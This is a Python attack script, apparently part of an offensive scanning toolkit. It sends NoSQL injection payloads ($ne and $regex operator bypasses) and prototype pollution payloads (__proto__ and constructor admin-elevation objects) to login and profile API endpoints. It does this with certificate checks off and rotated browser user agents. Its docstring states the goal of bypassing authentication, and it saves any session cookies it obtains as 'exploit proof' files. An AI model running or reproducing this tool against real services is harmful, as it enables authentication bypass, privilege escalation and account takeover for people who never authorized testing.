import asyncio
import http.client
import ssl
import json
import urllib.parse
import random
import time

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"
]

def _send_http_request(host, port, path, payload, use_ssl, method="POST"):
    """Synchronous transport handler for JSON payloads and query mutations."""
    try:
        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=5.0) if use_ssl else http.client.HTTPConnection(host, port, timeout=5.0)
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Referer": f"https://{host}{path}",
            "Connection": "close"
        }
        data = json.dumps(payload)
        conn.request(method, path, data.encode("utf-8"), headers)
        resp = conn.getresponse()
        status = resp.status
        body = resp.read().decode(errors="ignore")
        headers_dict = dict(resp.getheaders())
        conn.close()
        return status, headers_dict, body, None
    except Exception as e:
        return 0, {}, "", str(e)

async def test_nosql_and_pollution(target_host, port=443, use_ssl=True):
    """
    Executes advanced NoSQL injection and JavaScript prototype pollution 
    against target API endpoints to bypass authentication and alter application state.
    """
    print(f"\n\033[95m[***] ENGAGING NOSQL & PROTOTYPE POLLUTION ENGINE [{target_host}] [***]\033[0m")
    
    target_endpoints = [
        "/api/auth/login",
        "/api/v1/auth/login",
        "/api/user/update",
        "/api/profile"
    ]
    
    # Advanced NoSQL & Prototype Pollution Payload Vectors
    mutation_vectors = [
        # NoSQL Injection: Always true operator bypasses
        {"name": "NoSQL Operator Bypass ($ne)", "payload": {"username": {"$ne": None}, "password": {"$ne": None}}},
        {"name": "NoSQL Regex Enumeration", "payload": {"username": {"$regex": "^admin"}, "password": {"$ne": ""}}},
        
        # JavaScript Prototype Pollution Vectors
        {"name": "Prototype Pollution (__proto__ admin elevation)", "payload": {"__proto__": {"isAdmin": True, "role": "admin", "authenticated": True}, "username": "admin", "password": "x"}},
        {"name": "Prototype Pollution (constructor prototype)", "payload": {"constructor": {"prototype": {"isAdmin": True, "privileged": True}}}}
    ]
    
    successful_findings = []
    
    for path in target_endpoints:
        for vector in mutation_vectors:
            print(f" \033[90m[*] Testing {path} with vector: {vector['name']}\033[0m")
            
            status, headers, body, err = await asyncio.to_thread(
                _send_http_request, target_host, port, path, vector["payload"], use_ssl
            )
            
            if err:
                continue
                
            body_lower = body.lower()
            set_cookie = headers.get("Set-Cookie", "")
            has_session = any(k in set_cookie.lower() for k in ["session", "token", "jwt", "connect.sid"])
            
            # Differential Verification: Check for successful auth or state change indicators
            if (status == 200 and has_session) or ("welcome" in body_lower or "dashboard" in body_lower or "admin" in body_lower or "success" in body_lower):
                finding = {
                    "endpoint": path,
                    "vector_type": vector["name"],
                    "payload": vector["payload"],
                    "status_code": status,
                    "cookies": set_cookie,
                    "response_preview": body[:200]
                }
                print(f" \033[92m[+++] VULNERABILITY CONFIRMED: {vector['name']} on {path} (Status: {status})\033[0m")
                successful_findings.append(finding)
                
                # Save exploit proof to reports
                import os
                os.makedirs("reports/exploits", exist_ok=True)
                with open(f"reports/exploits/nosql_pollution_hit_{int(time.time())}.json", "w") as f:
                    json.dump(finding, f, indent=4)
                    
                return successful_findings

    print(f" \033[33m[*] NoSQL & Prototype pollution scan concluded. Verified hits: {len(successful_findings)}\033[0m")
    return successful_findings
